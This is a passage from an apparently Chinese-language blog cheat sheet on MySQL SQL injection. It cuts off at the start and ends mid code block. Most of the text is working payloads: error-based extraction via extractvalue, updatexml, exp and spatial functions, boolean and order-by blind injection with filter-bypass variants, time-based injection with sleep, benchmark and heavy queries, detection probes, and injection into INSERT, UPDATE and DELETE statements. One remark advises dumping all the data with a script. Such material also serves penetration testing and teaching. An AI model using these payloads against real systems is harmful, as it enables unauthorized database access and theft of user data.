title="注入语句"></a>注入语句</h5><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, (select @@version),<span class="hljs-number">0x7e</span>))</span><br></pre></td></tr></tbody></table></figure><p></p><h5 id="注入原理-2"><a href="#注入原理-2" class="headerlink" title="注入原理"></a>注入原理</h5><p></p><figure class="highlight lisp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXTRACTVALUE (<span class="hljs-name">XML_document</span>, XPath_string)<span class="hljs-comment">;</span></span><br></pre></td></tr></tbody></table></figure><p></p><ul><li>第一个参数：XML_document是 String 格式，为 XML 文档对象的名称，文中为 Doc</li><li>第二个参数：XPath_string ( Xpath 格式的字符串)</li><li>作用：从目标 XML 中返回包含所查询值的字符串</li></ul><p>第二个参数都要求是符合<code>xpath</code>语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里</p><h4 id="NAME-CONST-适用于低版本，不太好用"><a href="#NAME-CONST-适用于低版本，不太好用" class="headerlink" title="NAME_CONST(适用于低版本，不太好用)"></a>NAME_CONST(适用于低版本，不太好用)</h4><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=261 and 1=(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">NAME_CONST</span>(<span class="hljs-keyword">version</span>(),<span class="hljs-number">1</span>),<span class="hljs-keyword">NAME_CONST</span>(<span class="hljs-keyword">version</span>(),<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> x)</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Error-based-Double-Query-Injection"><a href="#Error-based-Double-Query-Injection" class="headerlink" title="Error based Double Query Injection"></a>Error based Double Query Injection</h4><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">or</span> 1<span class="hljs-built_in"> group </span>by concat_ws(0x7e,version(),floor(rand(0)<span class="hljs-number">*2</span>)) having min(0) <span class="hljs-keyword">or</span> 1</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="exp-5-5-5以上"><a href="#exp-5-5-5以上" class="headerlink" title="exp(5.5.5以上)"></a>exp(5.5.5以上)</h4><p>在 mysql 5.5 之前，整形溢出是不会报错的，根据官方文档说明<code>out-of-range-and-overflow</code>，只有版本号大于5.5.5 时，才会报错。利用<code>exp</code>函数也产生类似的溢出错误</p><p></p><figure class="highlight n1ql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (<span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)))</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="测试未通过，存在可用性的"><a href="#测试未通过，存在可用性的" class="headerlink" title="测试未通过，存在可用性的"></a>测试未通过，存在可用性的</h4><p>emetryCollection() multipoint() polygon() multipolygon() linestring() multilinestring()</p><p>以上函数均为MySQL中的空间数据类型（存储）的函数，目前仅在MyISAM数据引擎下提供空间索引支持,要求几何字段非空</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">multipoint()</span><br><span class="line">?id=1 or multipoint((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))%<span class="hljs-number">23</span></span><br><span class="line"></span><br><span class="line">multipolygon()</span><br><span class="line">?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> multipolygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())a)b))%<span class="hljs-number">23</span></span><br><span class="line"></span><br><span class="line">multilinestring()</span><br><span class="line">?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> multilinestring((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))%<span class="hljs-number">23</span></span><br><span class="line"></span><br><span class="line">linestring()</span><br><span class="line">?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> LINESTRING((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))%<span class="hljs-number">23</span></span><br><span class="line"></span><br><span class="line">GeometryCollection()</span><br><span class="line">?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> GeometryCollection((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))%<span class="hljs-number">23</span></span><br><span class="line"></span><br><span class="line">polygon()</span><br><span class="line">?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> polygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))%<span class="hljs-number">23</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Bool-盲注"><a href="#Bool-盲注" class="headerlink" title="Bool 盲注"></a>Bool 盲注</h3><p>在许多情况下，通过前面的测试会发现页面没有回显提取的数据，但是根据语句是否执行成功与否会有一些相应的变化。</p><ul><li>正确/错误的语句使得页面有适度的变化。可以尝试使用布尔注入</li><li>正确语句返回正常页面，错误的语句返回通用错误页面。可以尝试使用布尔注入。</li><li>提交错误语句，不影响页面的正常输出。建议尝试使用延时注入。</li></ul><p>几种简单的判断语句，在真实利用中需要根据情况而变化:</p><ul><li>CASE</li><li>IF()</li><li>IFNULL()</li><li>NULLIF()</li></ul><p>盲注的时候一定注意，MySQL4之后大小写不敏感，可使用<code>binary()</code>函数使大小写敏感。</p><h4 id="构造-bool-条件"><a href="#构造-bool-条件" class="headerlink" title="构造 bool 条件"></a>构造 bool 条件</h4><p></p><figure class="highlight pgsql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//正常情况</span><br><span class="line"><span class="hljs-string">'or bool#</span></span><br><span class="line"><span class="hljs-string">true'</span><span class="hljs-keyword">and</span> <span class="hljs-type">bool</span>#</span><br><span class="line">    </span><br><span class="line">//不使用空格、注释</span><br><span class="line"><span class="hljs-string">'or(bool)='</span><span class="hljs-number">1</span></span><br><span class="line">tru<span class="hljs-string">e'and(bool)='</span><span class="hljs-number">1</span></span><br><span class="line">    </span><br><span class="line">//不使用<span class="hljs-keyword">or</span>、<span class="hljs-keyword">and</span>、注释</span><br><span class="line"><span class="hljs-string">'^!(bool)='</span><span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-string">'=(bool)='</span></span><br><span class="line"><span class="hljs-string">'||(bool)='</span><span class="hljs-number">1</span></span><br><span class="line">tru<span class="hljs-string">e'%26%26(bool)='</span><span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-string">'=if((bool),1,0)='</span><span class="hljs-number">0</span></span><br><span class="line">    </span><br><span class="line">//不使用等号、空格、注释</span><br><span class="line"><span class="hljs-string">'or(bool)&lt;&gt;'</span><span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-string">'or((bool)in(1))or'</span><span class="hljs-number">0</span></span><br><span class="line">    </span><br><span class="line">//其他</span><br><span class="line"><span class="hljs-keyword">or</span> (<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (<span class="hljs-type">bool</span>) <span class="hljs-keyword">then</span> <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>有时候<code>where</code>字句有括号又猜不到 SQL 语句的时候，可以有下列类似的 fuzz</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' or (bool) or '1'='1</span><br><span class="line">1%' and (bool) or 1=1 and '1'='1</span><br></pre></td></tr></tbody></table></figure><p></p><p>有时候也可以通过与表中的数据进行对比</p><p></p><figure class="highlight asciidoc hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username="" || id=2 &amp;&amp; password&lt;"5";</span><br><span class="line"><span class="hljs-code">+----+</span>----------<span class="hljs-code">+----------+</span>------+</span><br><span class="line">| id | username | password | num  |</span><br><span class="line"><span class="hljs-code">+----+</span>----------<span class="hljs-code">+----------+</span>------+</span><br><span class="line">|  2 | admin    | 456      |   20 |</span><br><span class="line"><span class="hljs-code">+----+</span>----------<span class="hljs-code">+----------+</span>------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select * from admin where username="" || id=3 &amp;&amp; password&lt;"8";</span><br><span class="line"><span class="hljs-code">+----+</span>----------<span class="hljs-code">+----------+</span>------+</span><br><span class="line">| id | username | password | num  |</span><br><span class="line"><span class="hljs-code">+----+</span>----------<span class="hljs-code">+----------+</span>------+</span><br><span class="line">|  3 | test     | 789      |   30 |</span><br><span class="line"><span class="hljs-code">+----+</span>----------<span class="hljs-code">+----------+</span>------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select * from admin where username="" || id=3 &amp;&amp; password&lt;"7";</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>这样通过id指定的话改一下payload直接上脚本把数据全脱了。另外如果想跨表查询的话</p><p></p><figure class="highlight asciidoc hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select a.password&lt;<span class="hljs-emphasis">'z'</span> from users a limit 1,1;</span><br><span class="line"><span class="hljs-code">+----------------+</span></span><br><span class="line">| a.password&lt;<span class="hljs-emphasis">'z'</span> |</span><br><span class="line"><span class="hljs-code">+----------------+</span></span><br><span class="line">|              1 |</span><br><span class="line"><span class="hljs-code">+----------------+</span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="构造逻辑判断"><a href="#构造逻辑判断" class="headerlink" title="构造逻辑判断"></a>构造逻辑判断</h4><p></p><figure class="highlight stylus hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(user()</span></span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">'r'</span>  </span><br><span class="line"><span class="hljs-function"><span class="hljs-title">right</span><span class="hljs-params">(user()</span></span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">'r'</span>  </span><br><span class="line"><span class="hljs-function"><span class="hljs-title">substr</span><span class="hljs-params">(user()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">'r'</span>  </span><br><span class="line"><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(user()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">'r'</span> </span><br><span class="line">    </span><br><span class="line"><span class="hljs-comment">//不使用逗号 </span></span><br><span class="line"><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span> regexp <span class="hljs-string">'^[a-z]'</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span> like <span class="hljs-string">'root%'</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-title">POSITION</span><span class="hljs-params">(<span class="hljs-string">'root'</span> in user()</span></span>)</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(user()</span></span> from <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>)=<span class="hljs-string">'r'</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(user()</span></span> from <span class="hljs-number">1</span>)=<span class="hljs-string">'r'</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><code>ASCII()</code>、<code>ORD()</code>和<code>CHAR()</code>函数一般用做辅助。</p><h4 id="利用-order-by-盲注"><a href="#利用-order-by-盲注" class="headerlink" title="利用 order by 盲注"></a>利用 order by 盲注</h4><p></p><figure class="highlight asciidoc hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where username='' or 1 union select 1,2,<span class="hljs-emphasis">'5'</span> order by 3;</span><br><span class="line"><span class="hljs-code">+----+</span>----------<span class="hljs-code">+----------------------------------+</span></span><br><span class="line">| id | username | password                         |</span><br><span class="line"><span class="hljs-code">+----+</span>----------<span class="hljs-code">+----------------------------------+</span></span><br><span class="line">|  1 | 2        | 5                                |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line"><span class="hljs-code">+----+</span>----------<span class="hljs-code">+----------------------------------+</span></span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"><span class="hljs-code">    </span></span><br><span class="line">mysql&gt; select * from admin where username='' or 1 union select 1,2,<span class="hljs-emphasis">'6'</span> order by 3;</span><br><span class="line"><span class="hljs-code">+----+</span>----------<span class="hljs-code">+----------------------------------+</span></span><br><span class="line">| id | username | password                         |</span><br><span class="line"><span class="hljs-code">+----+</span>----------<span class="hljs-code">+----------------------------------+</span></span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 6                                |</span><br><span class="line"><span class="hljs-code">+----+</span>----------<span class="hljs-code">+----------------------------------+</span></span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>这种注入一般出现在登录处，形成<code>bool</code>条件。这里只获取<code>password</code>的值，也可以跟多个<code>UNION</code>查询其他的数据，此方法优点在于不使用括号等号等字符。利用<code>order by</code>姿势很多，自由发挥了。</p><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>一般会用到几个函数。使用这些的效果，是为了延缓mysql的操作，从而检测到与平时有异的情况：</p><ul><li>SLEEP(n) 让mysql停n秒钟</li><li>BENCHMARK(count,expr) 重复countTimes次执行表达式expr，如<code>BENCHMARK(100000,MD5(1))</code></li></ul><p><code>BENCHMARK()</code>用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用<code>sleep()</code>。</p><p>一些注意事项：</p><ul><li>使用基于时间的盲注比较不准确，因为这还取决于当前的网络环境。</li><li>时间延缓最好不要超过30秒，否则容易导致mysql的API连接超时。</li><li>当在页面上看不到任何明显变化时，再考虑选择使用延时注入</li></ul><p>相对于bool盲注，就是把返回值0和1改为是否执行延时，<strong>能用其他方法就不使用延时</strong>。</p><p>一般格式<code>if((bool),sleep(3),0)</code>和<code>or (case when (bool) then sleep(3) else 0 end)</code></p><p>如果这两个函数ban掉的话可以利用笛卡尔积造成延迟来进行注入。</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and if(ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),%d,<span class="hljs-number">1</span>))&lt;%d,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">FROM</span> information_schema.columns A, information_schema.columns B,information_schema.tables C),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>另外还可以利用不正确的正则表达式来</p><p></p><figure class="highlight lisp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(<span class="hljs-name">substr</span>((<span class="hljs-name">select</span> <span class="hljs-number">1</span>)='<span class="hljs-number">1</span>',<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),concat(<span class="hljs-name">rpad</span>(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,'a'),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,'a'),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,'a'),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,'a'),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,'a'),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,'a'),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,'a'),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,'a'),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,'a'),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,'a'),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,'a'),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,'a'),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,'a'),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,'a'),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,'a'),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,'a')) RLIKE '(a.*)+(a.*)+(<span class="hljs-name">a</span>.*)+(a.*)+(<span class="hljs-name">a</span>.*)+(a.*)+(<span class="hljs-name">a</span>.*)+b',1);</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h4><p></p><figure class="highlight lsl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">1</span> OR SLEEP(<span class="hljs-number">25</span>)=<span class="hljs-number">0</span> LIMIT <span class="hljs-number">1</span> #</span><br><span class="line"><span class="hljs-number">1</span>) OR SLEEP(<span class="hljs-number">25</span>)=<span class="hljs-number">0</span> LIMIT <span class="hljs-number">1</span> #</span><br><span class="line"><span class="hljs-number">1</span>' OR SLEEP(<span class="hljs-number">25</span>)=<span class="hljs-number">0</span> LIMIT <span class="hljs-number">1</span> #</span><br><span class="line">') OR SLEEP(<span class="hljs-number">25</span>)=<span class="hljs-number">0</span> LIMIT <span class="hljs-number">1</span> #</span><br><span class="line"><span class="hljs-number">1</span>)) OR SLEEP(<span class="hljs-number">25</span>)=<span class="hljs-number">0</span> LIMIT <span class="hljs-number">1</span> #</span><br><span class="line">SELECT SLEEP(<span class="hljs-number">25</span>) #</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">IF</span>(<span class="hljs-keyword">SUBSTR</span>((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(schema_name SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA),i,<span class="hljs-number">1</span>) &lt; j,<span class="hljs-keyword">BENCHMARK</span>(<span class="hljs-number">100000</span>,<span class="hljs-keyword">SHA1</span>(<span class="hljs-number">1</span>)),<span class="hljs-number">0</span>);</span><br><span class="line"></span><br><span class="line">UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">IF</span>(<span class="hljs-keyword">SUBSTR</span>((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(schema_name SEPARATOR <span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA),i,<span class="hljs-number">1</span>) &lt; j,<span class="hljs-keyword">SLEEP</span>(<span class="hljs-number">10</span>),<span class="hljs-number">0</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="insert-update-delete-注入"><a href="#insert-update-delete-注入" class="headerlink" title="insert/update/delete 注入"></a>insert/update/delete 注入</h3><h4 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h4><p>报错注入方式：</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> message(<span class="hljs-keyword">id</span>,user_id,message_id) <span class="hljs-keyword">values</span> (<span class="hljs-number">4</span>,<span class="hljs-string">'zedd'</span> <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">0</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">''</span>, <span class="hljs-string">'hi'</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> message(<span class="hljs-keyword">id</span>,user_id,message_id) <span class="hljs-keyword">values</span> (<span class="hljs-number">4</span>,<span class="hljs-string">'zedd'</span> <span class="hljs-keyword">or</span> extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @@<span class="hljs-keyword">version</span>))) <span class="hljs-keyword">or</span> <span class="hljs-string">''</span>, <span class="hljs-string">'hi'</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>没有回显可以使用延时</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> message(<span class="hljs-keyword">id</span>,user_id,message_id) <span class="hljs-keyword">values</span> (<span class="hljs-number">5</span>,<span class="hljs-string">'0'</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">IF</span>(<span class="hljs-keyword">SUBSTR</span>((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">GROUP_CONCAT</span>(schema_name) <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)&lt;<span class="hljs-number">200</span>,<span class="hljs-keyword">SLEEP</span>(<span class="hljs-number">10</span>),<span class="hljs-number">0</span>), <span class="hljs-string">'hi'</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="update"><a href="#update" class="headerlink" title="update"></a>update</h4><p>报错注入方式：</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">update</span> message <span class="hljs-keyword">set</span> user_id=<span class="hljs-string">'1'</span> <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">version</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">0</span>) <span class="hljs-keyword">or</span><span class="hljs-string">''</span><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">update</span> message <span class="hljs-keyword">set</span> user_id=<span class="hljs-string">'1'</span> <span class="hljs-keyword">or</span> extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">database</span>())) <span class="hljs-keyword">or</span><span class="hljs-string">''</span><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">2</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p>报错注入方式：</p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> message <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">2</span> <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">version</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">0</span>) <span class="hljs-keyword">or</span><span class="hljs-string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> message <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">2</span> <span class="hljs-keyword">or</span> extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">database</span>())) <span class="hljs-keyword">or</span><span class="hljs-string">''</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Order-by-后注入"><a href="#Order-by-后注入" class="headerlink" title="Order by 后注入"></a>Order by 后注入</h3><h4 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h4><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1, concat(0x7e, (<span class="hljs-keyword">select</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="bool盲注-利用-rand"><a href="#bool盲注-利用-rand" class="headerlink" title="bool盲注 利用 rand()"></a>bool盲注 利用 rand()</h4><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by IF((bool),1,(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">2</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><p>使用<code>rand</code></p><p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 